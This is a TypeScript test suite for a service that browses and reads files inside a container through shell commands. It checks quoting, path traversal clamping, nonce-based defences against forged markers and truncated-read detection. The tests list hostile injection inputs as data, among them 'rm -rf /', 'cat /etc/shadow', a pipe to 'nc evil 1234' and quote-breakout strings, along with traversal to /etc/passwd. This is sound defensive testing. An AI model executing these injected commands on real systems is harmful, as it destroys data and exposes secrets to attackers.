import { describe, it, expect } from "vitest";
import {
  shellQuote,
  newProbeNonce,
  normalizeContainerPath,
  joinContainerPath,
  buildListCommand,
  parseListOutput,
  buildReadCommand,
  parseReadOutput,
  looksBinary,
  MAX_ENTRIES,
  MAX_PREVIEW_BYTES,
  MAX_DOWNLOAD_BYTES,
} from "./service-files.service";

const N = "deadbeefcafe0123456789ab";
const rec = (kind: string, link: string, size: string, name: string) =>
  `${N}\tE\t${kind}\t${link}\t${size}\t${name}`;
const end = `${N}\tEND`;

/**
 * Every command this module builds is handed to `sh -c` INSIDE the target
 * container. The path is attacker-controlled, so quoting is a security
 * boundary, not a formatting detail — these are the tests that hold it.
 */
describe("shellQuote", () => {
  it("wraps a plain value in single quotes", () => {
    expect(shellQuote("/var/www/html")).toBe("'/var/www/html'");
  });

  it("neutralises command separators and substitution", () => {
    for (const attack of [
      "/tmp; rm -rf /",
      "/tmp && cat /etc/shadow",
      "/tmp | nc evil 1234",
      "/tmp$(whoami)",
      "/tmp`whoami`",
      "/tmp\nrm -rf /",
      "/tmp${IFS}x",
    ]) {
      const quoted = shellQuote(attack);
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      expect(quoted.slice(1, -1)).not.toContain("'");
    }
  });

  it("escapes embedded single quotes so the string cannot be broken out of", () => {
    expect(shellQuote("/tmp/it's")).toBe("'/tmp/it'\\''s'");
    expect(shellQuote("';id;'")).toBe("''\\'';id;'\\'''");
  });

  it("round-trips through a real shell for every hostile input", async () => {
    // Quoting bugs are invisible in string assertions and fatal in production,
    // so assert against the actual sh.
    const { execFile } = await import("node:child_process");
    const { promisify } = await import("node:util");
    const run = promisify(execFile);
    for (const value of ["/tmp/it's", "a b", "x$(id)", "y`id`", "z;id", "d'q\"m", "n\nl"]) {
      const { stdout } = await run("sh", ["-c", `printf %s ${shellQuote(value)}`]);
      expect(stdout).toBe(value);
    }
  });
});

describe("newProbeNonce", () => {
  it("is unpredictable and shell-safe", () => {
    const a = newProbeNonce();
    expect(a).toMatch(/^[0-9a-f]{24}$/);
    // A filename cannot contain what it cannot guess — that is the whole basis
    // of the forgery defence, so a repeated value would silently undo it.
    expect(new Set(Array.from({ length: 50 }, newProbeNonce)).size).toBe(50);
  });
});

describe("normalizeContainerPath", () => {
  it("keeps an absolute path canonical", () => {
    expect(normalizeContainerPath("/var/www/html")).toBe("/var/www/html");
    expect(normalizeContainerPath("/var//www///html/")).toBe("/var/www/html");
    expect(normalizeContainerPath("/")).toBe("/");
  });

  it("defaults an empty or missing path to the root", () => {
    expect(normalizeContainerPath("")).toBe("/");
    expect(normalizeContainerPath(undefined)).toBe("/");
  });

  it("resolves . and .. segments", () => {
    expect(normalizeContainerPath("/var/www/../log")).toBe("/var/log");
    expect(normalizeContainerPath("/var/./www")).toBe("/var/www");
  });

  it("clamps traversal above the root instead of escaping it", () => {
    expect(normalizeContainerPath("/../../etc")).toBe("/etc");
    expect(normalizeContainerPath("/..")).toBe("/");
  });

  it("forces a relative path to be absolute", () => {
    expect(normalizeContainerPath("var/www")).toBe("/var/www");
  });

  it("rejects a NUL byte outright", () => {
    expect(normalizeContainerPath("/tmp/\0/etc/passwd")).toBeNull();
  });
});

describe("joinContainerPath", () => {
  it("joins a directory and an entry name", () => {
    expect(joinContainerPath("/var/www", "index.php")).toBe("/var/www/index.php");
    expect(joinContainerPath("/", "etc")).toBe("/etc");
  });

  it("does not let an entry name climb out of its directory", () => {
    expect(joinContainerPath("/var/www", "../../etc/passwd")).toBe("/etc/passwd");
  });
});

describe("buildListCommand", () => {
  it("embeds the path quoted, never raw", () => {
    const path = "/tmp; rm -rf /";
    const cmd = buildListCommand(path, N);
    expect(cmd).toContain(shellQuote(path));
    expect(cmd.split(shellQuote(path)).join("")).not.toContain("rm -rf");
  });

  it("always exits zero so a missing directory is data, not a thrown exec", () => {
    // `exec` REJECTS on a non-zero exit with stdout as the message, so leaning
    // on exit codes would turn every "not found" into a 500.
    expect(buildListCommand("/x", N)).toContain("exit 0");
  });

  it("caps the entry count so a huge directory can't cost thousands of forks", () => {
    expect(buildListCommand("/x", N, 500)).toContain("-gt 500");
  });

  it("resolves symlink targets so a symlinked directory stays navigable", () => {
    // `-d` dereferences; that is what makes `storage` / `current` openable.
    expect(buildListCommand("/x", N)).toContain(`if [ -d "$e" ]; then k=d`);
  });
});

describe("parseListOutput", () => {
  it("parses a normal listing", () => {
    const out = [
      rec("d", "0", "0", "app"),
      rec("d", "0", "0", "config"),
      rec("f", "0", "1042", ".env"),
      rec("f", "0", "53", "composer.json"),
      end,
    ].join("\n");
    expect(parseListOutput(out, N)).toEqual({
      ok: true,
      truncated: false,
      entries: [
        { name: "app", type: "dir", symlink: false, size: 0 },
        { name: "config", type: "dir", symlink: false, size: 0 },
        { name: ".env", type: "file", symlink: false, size: 1042 },
        { name: "composer.json", type: "file", symlink: false, size: 53 },
      ],
    });
  });

  it("sorts directories first, then case-insensitively by name", () => {
    const out = [rec("f", "0", "1", "zebra"), rec("f", "0", "1", "Apple"), rec("d", "0", "0", "zoo"), end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok && r.entries.map((e) => e.name)).toEqual(["zoo", "Apple", "zebra"]);
  });

  it("keeps names containing spaces intact", () => {
    const r = parseListOutput([rec("f", "0", "12", "my file name.txt"), end].join("\n"), N);
    expect(r.ok && r.entries[0]!.name).toBe("my file name.txt");
  });

  it("reports a symlinked directory as a navigable directory", () => {
    const r = parseListOutput([rec("d", "1", "0", "storage"), end].join("\n"), N);
    expect(r.ok && r.entries[0]).toEqual({
      name: "storage",
      type: "dir",
      symlink: true,
      size: 0,
    });
  });

  it("returns an empty list for an empty directory", () => {
    expect(parseListOutput(end, N)).toEqual({ ok: true, entries: [], truncated: false });
  });

  it("flags a truncated listing so the UI can say so", () => {
    const out = [rec("f", "0", "1", "a"), `${N}\tTRUNC`, end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok && r.truncated).toBe(true);
  });

  it("maps each error marker to a distinct reason", () => {
    expect(parseListOutput(`${N}\tERR\tnotfound`, N)).toEqual({ ok: false, reason: "not_found" });
    expect(parseListOutput(`${N}\tERR\tnotdir`, N)).toEqual({ ok: false, reason: "not_a_directory" });
    expect(parseListOutput(`${N}\tERR\tdenied`, N)).toEqual({ ok: false, reason: "permission_denied" });
  });

  it("treats a missing end sentinel as a truncated read, not an empty directory", () => {
    expect(parseListOutput(rec("f", "0", "1", "a.txt"), N)).toEqual({ ok: false, reason: "truncated" });
  });

  it("ignores noise lines that lack the nonce", () => {
    const out = ["sh: warning: something", rec("f", "0", "2", "real.txt"), end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok && r.entries.map((e) => e.name)).toEqual(["real.txt"]);
  });

  /* ── Marker forgery: newlines are legal in unix filenames ─────────────── */

  it("cannot be tricked into reporting an error by a filename containing a newline", () => {
    // A file literally named "evil\n<something>\tERR\tdenied". Without the
    // nonce scope this made the WHOLE directory render as permission-denied.
    const out = [rec("f", "0", "1", "evil\nERR\tdenied"), rec("f", "0", "1", "real.txt"), end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok).toBe(true);
    expect(r.ok && r.entries.some((e) => e.name === "real.txt")).toBe(true);
  });

  it("cannot be tricked into ending the listing early by a crafted filename", () => {
    // Forging END would truncate the listing while still reporting success —
    // hiding files from an operator who has every right to see them.
    const out = [rec("f", "0", "1", "evil\nEND"), rec("f", "0", "1", "hidden-by-forgery.txt"), end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok && r.entries.some((e) => e.name === "hidden-by-forgery.txt")).toBe(true);
  });

  it("ignores markers carrying a DIFFERENT nonce", () => {
    const out = [`0000000000000000000000ff\tERR\tdenied`, rec("f", "0", "1", "real.txt"), end].join("\n");
    const r = parseListOutput(out, N);
    expect(r.ok && r.entries.map((e) => e.name)).toEqual(["real.txt"]);
  });
});

describe("buildReadCommand", () => {
  it("quotes the path and caps the byte count", () => {
    const cmd = buildReadCommand("/tmp/a b.txt", 1024, N);
    expect(cmd).toContain(shellQuote("/tmp/a b.txt"));
    expect(cmd).toContain("1024");
    expect(cmd).toContain("exit 0");
  });

  it("refuses anything that is not a regular file", () => {
    // Without `-f`, a FIFO or /dev/zero passes every other guard and
    // `wc -c` never returns — wedging the request past both size caps.
    expect(buildReadCommand("/x", 10, N)).toContain(`if [ ! -f "$f" ]`);
  });

  it("terminates the payload so a cut-short read is detectable", () => {
    expect(buildReadCommand("/x", 10, N)).toContain("END");
  });
});

describe("parseReadOutput", () => {
  const readOut = (raw: Buffer, opts?: { size?: number; wrap?: boolean }) => {
    const b64 = raw.toString("base64");
    const payload = opts?.wrap ? b64.replace(/(.{76})/g, "$1\n") : b64;
    return [`${N}\tSIZE\t${opts?.size ?? raw.length}`, `${N}\tDATA`, payload, `${N}\tEND`].join("\n");
  };

  it("decodes base64 payloads exactly, including binary bytes", () => {
    const raw = Buffer.from([0x00, 0x01, 0xff, 0xfe, 0x41]);
    const r = parseReadOutput(readOut(raw), MAX_PREVIEW_BYTES, N);
    expect(r.ok && r.content.equals(raw)).toBe(true);
  });

  it("tolerates the line wrapping both coreutils and busybox base64 emit", () => {
    const raw = Buffer.from("x".repeat(200));
    const r = parseReadOutput(readOut(raw, { wrap: true }), MAX_PREVIEW_BYTES, N);
    expect(r.ok && r.content.equals(raw)).toBe(true);
  });

  it("REFUSES a payload with no terminator instead of serving a partial file", () => {
    // docker's exec resolves on stream close and only throws on a NON-ZERO exit
    // code — null is falsy — so an early close does not throw. This is the only
    // thing standing between the user and a half-read .env that looks whole.
    const raw = Buffer.from("APP_KEY=secret\nDB_PASSWORD=hunter2\n");
    const truncated = readOut(raw).split("\n").slice(0, -1).join("\n");
    expect(parseReadOutput(truncated, MAX_PREVIEW_BYTES, N)).toMatchObject({ ok: false, reason: "incomplete" });
  });

  it("REFUSES when the decoded length disagrees with the size the container reported", () => {
    const raw = Buffer.from("0123456789");
    expect(parseReadOutput(readOut(raw, { size: 99 }), MAX_PREVIEW_BYTES, N)).toMatchObject({
      ok: false,
      reason: "incomplete",
      size: 99,
    });
  });

  it("reports the real size so the UI can refuse instead of truncating", () => {
    const out = [`${N}\tSIZE\t99999999`, `${N}\tERR\ttoolarge`].join("\n");
    expect(parseReadOutput(out, MAX_PREVIEW_BYTES, N)).toEqual({
      ok: false,
      reason: "too_large",
      size: 99999999,
    });
  });

  it("maps the remaining error markers", () => {
    for (const [marker, reason] of [
      ["notfound", "not_found"],
      ["isdir", "is_a_directory"],
      ["notregular", "not_regular"],
      ["denied", "permission_denied"],
      ["nobase64", "no_base64"],
    ] as const) {
      expect(parseReadOutput(`${N}\tERR\t${marker}`, MAX_PREVIEW_BYTES, N)).toMatchObject({
        ok: false,
        reason,
      });
    }
  });

  it("rejects a payload that exceeds the cap even if the container lied about size", () => {
    const raw = Buffer.alloc(64, 0x41);
    expect(parseReadOutput(readOut(raw), 32, N)).toMatchObject({ ok: false, reason: "too_large" });
  });

  it("fails closed on garbage rather than returning half a file", () => {
    expect(parseReadOutput("total nonsense", MAX_PREVIEW_BYTES, N)).toMatchObject({ ok: false });
  });

  it("ignores markers carrying a different nonce", () => {
    const foreign = readOut(Buffer.from("x")).replaceAll(N, "0000000000000000000000ff");
    expect(parseReadOutput(foreign, MAX_PREVIEW_BYTES, N)).toMatchObject({ ok: false, reason: "malformed" });
  });
});

describe("looksBinary", () => {
  it("treats a NUL byte as binary", () => {
    expect(looksBinary(Buffer.from([0x41, 0x00, 0x42]))).toBe(true);
  });

  it("treats ordinary text as text", () => {
    expect(looksBinary(Buffer.from("APP_ENV=production\nDB_HOST=db\n"))).toBe(false);
  });

  it("treats UTF-8 text as text", () => {
    expect(looksBinary(Buffer.from("olá — ção 日本語\n", "utf8"))).toBe(false);
  });

  it("treats an empty file as text", () => {
    expect(looksBinary(Buffer.alloc(0))).toBe(false);
  });
});

describe("caps", () => {
  it("keeps the preview cap well under the download cap", () => {
    expect(MAX_PREVIEW_BYTES).toBeLessThan(MAX_DOWNLOAD_BYTES);
  });

  it("keeps the download cap small enough to survive base64 in memory", () => {
    expect(MAX_DOWNLOAD_BYTES).toBeLessThanOrEqual(16 * 1024 * 1024);
  });

  it("bounds the per-listing fork count", () => {
    expect(MAX_ENTRIES).toBeGreaterThan(0);
    expect(MAX_ENTRIES).toBeLessThanOrEqual(1000);
  });
});
